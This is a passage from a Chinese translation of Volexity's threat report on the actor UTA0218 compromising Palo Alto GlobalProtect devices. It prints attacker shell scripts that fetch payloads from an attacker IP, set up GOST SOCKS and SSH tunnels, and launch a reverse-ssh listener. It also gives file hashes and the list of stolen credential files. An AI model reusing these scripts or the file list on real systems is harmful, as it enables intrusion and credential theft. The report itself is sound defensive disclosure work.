rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">b9f5e9db9eec8d1301026c443363cf6b</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">SHA1</span></p></td><td width="475" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">d7a8d8303361ffd124cb64023095da08a262cab4</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">SHA256</span></p></td><td width="475" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">fe07ca449e99827265ca95f9f56ec6543a4c5b712ed50038a9a153199e95a0b7</span></p></td></tr><tr style="appearance: none;outline: 0px;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">VirusTotal First Submitted</span></p></td><td width="475" style="appearance: none;padding: 0.5rem;vertical-align: top;outline: 0px;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">N/A</span></p></td></tr></tbody></table>  
```
#!/bin/bash
wget http://172.233.228[.]93/vpn_prot.gz -O /tmp/vpn_prot.gz
ls -l /tmp/vpn_prot.gz > /var/appweb/sslvpndocs/global-protect/u.css
gzip -d /tmp/vpn_prot.gz
chmod +x /tmp/vpn_prot
nohup /tmp/vpn_prot -L=socks5://127.0.0[.]1:8123 > /dev/null 2>&1 &
nohup /tmp/vpn_prot -L rtcp://127.0.0[.]1:8080/127.0.0[.]1:8123 -F ssh://user0:[password_redacted]@172.233.228[.]93:8443?ping=180 > /dev/null 2>&1 &
```  
  
  
**版本5**  
  
这是版本 4 的修改版本，可成功下载 Base64 编码格式的 GOST。  
  
<table><tbody style="appearance: none;outline: 0px;"><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">Name(s)</span></p></td><td width="469" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">policy</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">Size</span></p></td><td width="469" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">421B (421 Bytes)</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">File Type</span></p></td><td width="469" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">text/x-shellscript</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">MD5</span></p></td><td width="469" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">12b5e30c2276664e87623791085a3221</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">SHA1</span></p></td><td width="469" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">f99779a5c891553ac4d4cabf928b2121ca3d1a89</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">SHA256</span></p></td><td width="469" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">96dbec24ac64e7dd5fef6e2c26214c8fe5be3486d5c92d21d5dcb4f6c4e365b9</span></p></td></tr><tr style="appearance: none;outline: 0px;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">VirusTotal First Submitted</span></p></td><td width="469" style="appearance: none;padding: 0.5rem;vertical-align: top;outline: 0px;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">N/A</span></p></td></tr></tbody></table>  
```
#!/bin/bashwget http://172.233.228[.]93/vpn.log -O /tmp/vpn.logbase64 -d /tmp/vpn.log > /tmp/vpn_prot.gzls -l /tmp/vpn_prot.gz > /var/appweb/sslvpndocs/global-protect/u.cssgzip -d /tmp/vpn_prot.gzchmod +x /tmp/vpn_protnohup /tmp/vpn_prot -L=socks5://127.0.0[.]1:8123 > /dev/null 2>&1 &nohup /tmp/vpn_prot -L rtcp://127.0.0[.]1:8080/127.0.0.1:8123 -F ssh://user0:[password_redacted]@172.233.228[.]93:8443?ping=180 > /dev/null 2>&1 &
```  
  
  
GOST样本详细信息如下：  
  
<table><tbody style="appearance: none;outline: 0px;"><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">Name(s)</span></p></td><td width="476" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">gost-linux-amd64</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">Size</span></p></td><td width="476" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">12.9MB (13578240 Bytes)</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">File Type</span></p></td><td width="476" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">ELF</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">MD5</span></p></td><td width="476" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">089801d87998fa193377b9bfe98e87ff</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">SHA1</span></p></td><td width="476" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">4ad043c8f37a916761b4c815bed23f036dfb7f77</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">SHA256</span></p></td><td width="476" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">448fbd7b3389fe2aa421de224d065cea7064de0869a036610e5363c931df5b7c</span></p></td></tr><tr style="appearance: none;outline: 0px;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">VirusTotal First Submitted</span></p></td><td width="476" style="appearance: none;padding: 0.5rem;vertical-align: top;outline: 0px;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">2023-01-29 01:30:47 UTC | af632c50 (api) - Unknown US</span></p></td></tr></tbody></table>**版本6**  
该文件包含用于下载和执行通过 SSH 运行的开源反向 shell 的命令。威胁参与者将此 shell 配置为在端口 31289 上运行。  
<table><tbody style="appearance: none;outline: 0px;"><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">Name(s)</span></p></td><td width="468" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">policy(6)</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">Size</span></p></td><td width="468" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">189.0B (189 Bytes)</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">File Type</span></p></td><td width="468" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">text/x-shellscript</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">MD5</span></p></td><td width="468" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">724c8059c150b0f3d1e0f80370bcfe19</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">SHA1</span></p></td><td width="468" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">5592434c40a30ed2dfdba0a86832b5f2eaaa437c</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">SHA256</span></p></td><td width="468" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">e315907415eb8cfcf3b6a4cd6602b392a3fe8ee0f79a2d51a81a928dbce950f8</span></p></td></tr><tr style="appearance: none;outline: 0px;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">VirusTotal First Submitted</span></p></td><td width="468" style="appearance: none;padding: 0.5rem;vertical-align: top;outline: 0px;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">N/A</span></p></td></tr></tbody></table>```
#!/bin/bash
wget http://172.233.228[.]93/lowdp -O /tmp/lowdp
ls -l /tmp/lowdp > /var/appweb/sslvpndocs/global-protect/u.css
chmod +x /tmp/lowdp
nohup /tmp/lowdp -l -p 31289 > /dev/null 2>&1 &
```  
  
二进制文件的详细信息如下所示：      
  
<table><tbody style="appearance: none;outline: 0px;"><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">Name(s)</span></p></td><td width="467" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">reverse-sshx64</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">Size</span></p></td><td width="467" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">3.5MB (3690496 Bytes)</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">File Type</span></p></td><td width="467" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">ELF</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">MD5</span></p></td><td width="467" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">427258462c745481c1ae47327182acd3</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">SHA1</span></p></td><td width="467" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">ef8036eb4097789577eff62f6c9580fa130e7d56</span></p></td></tr><tr style="appearance: none;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">SHA256</span></p></td><td width="467" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">161fd76c83e557269bee39a57baa2ccbbac679f59d9adff1e1b73b0f4bb277a6</span></p></td></tr><tr style="appearance: none;outline: 0px;"><td width="185" style="appearance: none;padding: 0.5rem;vertical-align: top;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="appearance: none;font-weight: 700;font-size: 15px;">VirusTotal First Submitted</span></p></td><td width="467" style="appearance: none;padding: 0.5rem;vertical-align: top;outline: 0px;border-width: 0.1rem;border-color: rgb(132, 132, 137);"><p style="margin-bottom: 16px;margin-top: 16px;"><span style="font-size: 15px;">2022-08-08 18:30:19 UTC | 1c0b809a (web) - Unknown NL</span></p></td></tr></tbody></table>  
  
**横向移动和数据盗窃**  
  
在成功入侵的一个实例中，攻击者使用帕洛阿尔托网络防火墙设备使用的高特权服务帐户通过 SMB 和 WinRM 进入内部网络。目标数据包括 Active Directory 数据库 ( ntds.dit)、关键数据 (DPAPI) 和 Windows 事件日志 ( Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx)。  
  
除了 Windows 相关数据外，攻击者还从特定目标窃取了 Chrome 和 Microsoft Edge 的Login Data、Cookies、 和数据。Local State利用这些数据，攻击者能够获取浏览器主密钥并解密敏感数据，例如存储的凭据。  
  
攻击者抓取的文件列表如下：  
```
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies
%LOCALAPPDATA%\Google\Chrome\User Data\Local State
%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data
%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Network
%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Network\Cookies
%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State
%APPDATA%\Roaming\Microsoft\Protect\<SID> -> DPAPI Keys
%SystemRoot%\NTDS\ntds.dit
%SystemRoot%\System32\winevt\Logs\Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx
```  
  
未观察到 U  
TA0218 在受害者网络内的系统上部署恶意软件或其他持久性方法。  
这可能部分归功于 Volexity 及其客户的快速检测和响应。  
被盗的数据确实使攻击者能够有效地破坏所有域帐户的凭据。  
此外，攻击者获得了访问权限，并可能使用从浏览器数据中获取的有效凭据或 cookie 来访问特定的用户工作站。  
  
**基础设施**  
  
Volexity 观察到 UTA0218 在运营过程中利用了多种基础设施，这些基础设施大致可分为两类：  
- 托管恶意软件的 C2 基础设施，用于通信通道  
  
- 匿名源基础设施，用于访问工具并与受害者基础设施交互  
  
匿名基础设施似乎混合使用了 VPN，以及可能受到损害的华硕路由器。该基础设施用于访问攻击者创建的文件。此外，UTA0218 滥用受感染的 AWS 存储桶和各种虚拟专用服务器 (VPS) 提供商来存储恶意文件。目前，Volexity 观察到的基础设施与 Volexity 孔径内的其他威胁行为者没有任何重叠。  
  
**结论**  
  
对于有能力的威胁参与者来说，针对边缘设备仍然是一种流行的攻击媒介，他们有时间和资源来投资研究新漏洞。拥有强大的检测堆栈对于识别与漏洞利用相关的活动至关重要，包括识别横向移动的网络监控和 EDR 功能。及早检测入侵大大减少了与缓解相关的范围和成本。  
  
Volexity 跟踪这篇博文中描述的名为 UTA0218 的活动。截至撰写本文时，Volexity 无法将该活动与其他威胁活动联系起来。根据开发和利用此类性质的漏洞所需的资源、该攻击者针对的受害者类型以及安装 Python 后门和进一步攻击所显示的功能，Volexity 评估 UTA0218 很可能是国家支持的威胁攻击者访问受害者网络。  
  
与之前公开披露的此类设备中的漏洞一样，Volexity 评估认为，UTA0218 和可能开发此漏洞漏洞利用的其他潜在威胁行为者在未来几天内可能会观察到漏洞利用激增。由于正在部署缓解措施和补丁，访问窗口关闭的紧迫性将推动活动的激增。因此，组织必须迅速采取行动，部署建议的缓解措施，并对其设备进行折衷审查，以检查是否需要对其网络进行进一步的内部调查。  
  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
